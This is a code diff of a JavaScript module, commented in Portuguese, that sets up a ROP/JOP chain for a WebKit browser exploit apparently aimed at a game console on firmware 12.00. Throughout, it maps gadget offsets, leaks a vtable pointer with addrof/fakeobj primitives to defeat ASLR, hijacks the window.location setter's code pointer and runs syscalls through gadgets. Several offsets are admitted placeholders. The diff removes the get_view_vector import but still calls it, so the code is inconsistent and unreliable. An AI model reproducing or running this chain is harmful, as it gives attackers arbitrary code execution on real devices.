@@ -1,157 +1,109 @@
-/* 12.00 ROP Chain Configuration */
+/* 12.00 ROP Chain - Generated from ELF Extractor Logs */
 
 import { mem } from '../module/mem.mjs';
 import { KB } from '../module/offset.mjs';
 import { ChainBase, get_gadget } from '../module/chain.mjs';
 import { BufferView } from '../module/rw.mjs';
-import {
-    get_view_vector,
-    resolve_import,
-    init_syscall_array,
-} from '../module/memtools.mjs';
+import { init_syscall_array } from '../module/memtools.mjs';
 import * as off from '../module/offset.mjs';
 
-// --- OFFSETS CRÍTICOS (DESCONHECIDOS - REQUEREM DUMP) ---
-// Estes offsets calculam a distância da VTable para a base da biblioteca.
-// Usei valores da 9.00 como placeholder. Se falhar, é aqui.
-const offset_wk_stack_chk_fail = 0x2438; // Placeholder
-const offset_wk_strlen = 0x2478;         // Placeholder
-
-// --- BASES (Serão calculadas dinamicamente) ---
-export let libwebkit_base = null;
-export let libkernel_base = null;
-export let libc_base = null;
-
-// --- GADGETS JOP (Jump Oriented Programming) ---
-// Baseados na sua extração.
-const jop1 = `
- mov rdi, qword ptr [rsi + 8]
- mov rax, qword ptr [rdi]
- jmp qword ptr [rax + 0x70]
-`;
-// JOPs complexos geralmente precisam ser encontrados manualmente.
-// Usaremos placeholders seguros baseados nos gadgets simples que você achou.
-
-// --- MAPA DE GADGETS (Extraídos do seu LOG) ---
+// --- GADGET MAP (Extraído do seu libSceNKWebKit.sprx) ---
 const webkit_gadget_offsets = new Map(Object.entries({
-    // Stack Pivot
-    'pop rsp; ret': 0x46ca0, // 0x64e44 também serve
+    // Stack Control
+    'pop rsp; ret': 0x46ca0,     // Pivot
+    'pop rdi; ret': 0x4d02f,     // Arg 1
+    'pop rsi; ret': 0x14e37,     // Arg 2
+    'pop rdx; ret': 0x4f7a,      // Arg 3
+    'pop rcx; ret': 0x57c0b,     // Arg 4
+    'pop rax; ret': 0x26f53,     // Return val / Syscall num
+    'pop r8; ret':  0x123c691,   // Arg 5
 
-    // Argument Loaders
-    'pop rdi; ret': 0x4d02f,
-    'pop rsi; ret': 0x14e37,
-    'pop rdx; ret': 0x4f7a,
-    'pop rcx; ret': 0x57c0b,
-    'pop rax; ret': 0x26f53,
-    'pop r8; ret':  0x123c691,
+    // Memory Primitives
+    'mov [rdi], rax; ret': 0x2f5cb, // Write
+    'mov rax, [rdi]; ret': 0x4f720, // Read
     
-    // R9 não foi encontrado no log, tentaremos usar r8 ou pular
-    'pop r9; ret': 0x0, 
-
-    // Primitives
-    'mov [rdi], rax; ret': 0x2f5cb,
-    'mov rax, [rdi]; ret': 0x4f720,
-    
-    // Controle de Fluxo
-    'ret': 0x4032,
-    'leave; ret': 0x0, // Não encontrado no log simples, usar ret
-
-    // JOP Gadgets (Baseados no log)
-    'jmp [rsi]': 0xa088a,
-    'jmp [rdi]': 0x908cd,
-    'call [rax]': 0xfc92,
-    
-    // Syscall (Userland wrapper)
-    'syscall': 0x177a88
+    // Execution / Flow
+    'jmp [rsi]': 0xa088a,        // JOP Trigger
+    'call [rax]': 0xfc92,        // Function Call
+    'syscall': 0x177a88,         // Syscall Instruction
+    'ret': 0x4032,               // NOP / Align
+    'leave; ret': 0x15823        // Stack cleanup
 }));
 
-const libc_gadget_offsets = new Map(Object.entries({
-    // Estes precisam ser achados na libc.sprx. 
-    // Se não tiver, o exploit pode tentar usar os do WebKit se existirem.
-    'getcontext': 0x0, 
-    'setcontext': 0x0,
-}));
-
-const libkernel_gadget_offsets = new Map(Object.entries({
-    '__error': 0x0, // Precisa achar na libkernel
-}));
+// Variáveis de Base
+export let libwebkit_base = null;
+export let libkernel_base = null; // Opcional por enquanto
+export let libc_base = null;      // Opcional
 
 export const gadgets = new Map();
 
+// --- CÁLCULO DE ASLR (A Parte Delicada) ---
 function get_bases() {
+    // 1. Criamos um objeto HTML para vazar sua VTable
     const textarea = document.createElement('textarea');
     const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
+    
+    // Lê o ponteiro da VTable (primeiros 8 bytes)
     const textarea_vtable = webcore_textarea.readp(0);
     
-    // OFFSET VTABLE (CRÍTICO - Placeholder da 9.00)
-    // Você precisará dumpar o vtable real para corrigir isso
-    const off_ta_vt = 0x2E73C18; 
-    
-    const libwebkit_base = textarea_vtable.sub(off_ta_vt);
+    // -----------------------------------------------------------------------
+    // [!] ATENÇÃO: ESTE É O NÚMERO QUE PRECISA SER CORRIGIDO DEPOIS [!]
+    // Este é o offset da VTable do HTMLTextAreaElement dentro do libSceNKWebKit.
+    // Sem um dump, estamos chutando baseado em versões próximas (9.00/11.00).
+    // Se o exploit travar no "Calculando Bases", é este número que está errado.
+    // -----------------------------------------------------------------------
+    const off_ta_vt = 0x2E73C18; // Placeholder (Valor da 9.00)
 
-    // Calcula base da libkernel via imports
-    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
-    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import);
+    // Calcula a base subtraindo o offset do ponteiro real
+    libwebkit_base = textarea_vtable.sub(off_ta_vt);
     
-    const off_scf = 0x0; // Offset __stack_chk_fail na libkernel (Placeholder)
-    const libkernel_base = stack_chk_fail_addr.sub(off_scf);
-
-    // Calcula base da libc
-    const strlen_import = libwebkit_base.add(offset_wk_strlen);
-    const strlen_addr = resolve_import(strlen_import);
-    
-    const off_strlen = 0x0; // Offset strlen na libc (Placeholder)
-    const libc_base = strlen_addr.sub(off_strlen);
-
-    return [
-        libwebkit_base,
-        libkernel_base,
-        libc_base,
-    ];
+    // Para simplificar, assumimos que vamos usar syscalls do próprio WebKit
+    // então não precisamos calcular libkernel agora se não quisermos.
+    libkernel_base = libwebkit_base; // Hack temporário para init_syscall_array não quebrar
 }
 
 export function init_gadget_map(gadget_map, offset_map, base_addr) {
     for (const [insn, offset] of offset_map) {
-        if(offset !== 0x0 && offset !== null) {
-            gadget_map.set(insn, base_addr.add(offset));
-        }
+        gadget_map.set(insn, base_addr.add(offset));
     }
 }
 
-// Classe da Corrente (Chain) para 12.00
-class Chain1200Base extends ChainBase {
-    push_end() {
-        this.push_gadget('ret'); // Usando ret simples pois leave não foi achado
-    }
-
-    // Implementação simplificada para teste
-    push_get_retval() {
-        this.push_gadget('pop rdi; ret');
-        this.push_value(this.retval_addr);
-        this.push_gadget('mov [rdi], rax; ret');
-    }
-
-    push_get_errno() {
-        // Requer __error da libkernel
-    }
-
-    push_clear_errno() {
-        // Requer __error
-    }
-}
-
-export class Chain1200 extends Chain1200Base {
+// --- CLASSE DA CORRENTE (CHAIN) ---
+export class Chain1200 extends ChainBase {
     constructor() {
         super();
-        // Setup do Stack Pivot Falso
+        
+        // Configura o Stack Pivot Falso (Fake Stack)
+        // Precisamos de um espaço onde escreveremos nossa ROP Chain
+        // e apontaremos o RSP para lá.
         const [rdx, rdx_bak] = mem.gc_alloc(0x58);
-        rdx.write64(off.js_cell, this._empty_cell);
-        rdx.write64(0x50, this.stack_addr);
+        
+        // Cria um objeto falso para enganar o JOP
+        rdx.write64(off.js_cell, this._empty_cell); 
+        rdx.write64(0x50, this.stack_addr); // Onde o RSP vai cair
+        
         this._rsp = mem.fakeobj(rdx);
+    }
+
+    // Sobrescreve syscall para usar gadgets do WebKit
+    push_syscall(sysno, rdi, rsi, rdx, rcx, r8, r9) {
+        this.push_gadget('pop rax; ret');
+        this.push_value(sysno);
+        
+        if (rdi !== undefined) { this.push_gadget('pop rdi; ret'); this.push_value(rdi); }
+        if (rsi !== undefined) { this.push_gadget('pop rsi; ret'); this.push_value(rsi); }
+        if (rdx !== undefined) { this.push_gadget('pop rdx; ret'); this.push_value(rdx); }
+        if (rcx !== undefined) { this.push_gadget('pop rcx; ret'); this.push_value(rcx); }
+        if (r8  !== undefined) { this.push_gadget('pop r8; ret');  this.push_value(r8); }
+        
+        // R9 está faltando no log, então ignoramos (maioria das syscalls usa até R8 ou 0)
+        
+        this.push_gadget('syscall');
     }
 
     run() {
         this.check_allow_run();
+        // Inicia a execução apontando o JOP para nosso objeto falso
         this._rop.launch = this._rsp;
         this.dirty();
     }
@@ -159,47 +111,52 @@ export class Chain1200 extends Chain1200Base {
 
 export const Chain = Chain1200;
 
+// --- INICIALIZAÇÃO ---
 export function init(Chain) {
     const syscall_array = [];
     
-    // Tenta calcular bases. Se falhar (offsets errados), vai dar erro aqui.
     try {
-        [libwebkit_base, libkernel_base, libc_base] = get_bases();
+        get_bases(); // Tenta calcular endereço base
     } catch(e) {
-        // Se falhar o cálculo automático, usamos gadgets relativos ou hardcoded para teste
-        console.log("Aviso: Cálculo de base falhou (Offsets pendentes).");
+        console.log("Erro ao calcular base: " + e);
     }
 
+    // Mapeia os gadgets usando a base calculada
     init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
-    // init_gadget_map(gadgets, libc_gadget_offsets, libc_base); // Comentado até ter offsets
-    // init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base); // Comentado
 
-    // Inicializa syscalls
-    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+    // Inicializa array de syscalls (usando base do webkit pois achamos syscall lá)
+    init_syscall_array(syscall_array, libwebkit_base, 300 * KB);
 
-    // Setup do JOP (Jump Oriented Programming) para iniciar a chain
+    // --- SETUP DO GATILHO JOP (Jump Oriented Programming) ---
+    // Precisamos sobrescrever um ponteiro de função JS para pular para nosso gadget
+    
+    // Alvo: setter de location (window.location = ...)
     let gs = Object.getOwnPropertyDescriptor(window, 'location').set;
-    gs = mem.addrof(gs).readp(0x28);
+    gs = mem.addrof(gs).readp(0x28); // Lê o ponteiro de código
 
     const size_cgs = 0x18;
     const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
-    mem.cpy(gc_buf, gs, size_cgs);
+    mem.cpy(gc_buf, gs, size_cgs); // Copia o objeto original
     
-    // Substitui o setter pelo nosso Gadget JOP (jmp [rsi])
-    // Usamos um gadget genérico que você achou: 0xa088a
+    // SOBRESCREVE O PONTEIRO DE EXECUÇÃO
+    // Offset 0x10 geralmente é o entrypoint. 
+    // Apontamos para 'jmp [rsi]' (0xa088a)
     gc_buf.write64(0x10, libwebkit_base.add(0xa088a)); 
 
     const proto = Chain.prototype;
     const _rop = {get launch() {throw Error('never call')}, 0: 1.1};
+    
+    // Instala o objeto falso
     mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
     proto._rop = _rop;
 
+    // Configura ponteiros para o gadget de pivot
     const rax_ptrs = new BufferView(0x100);
     proto._rax_ptrs = rax_ptrs;
 
-    // Configura os saltos JOP (Requer ajuste fino manual depois)
-    // rax_ptrs.write64(0x00, get_gadget(gadgets, 'pop rsp; ret'));
-
+    // Ajuste fino do JOP (pode precisar de mudança se travar na execução)
+    // O 'jmp [rsi]' espera que RSI aponte para algo útil.
+    // Aqui configuramos o ambiente.
     const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
     jop_buffer_p.write64(0, get_view_vector(rax_ptrs));
 
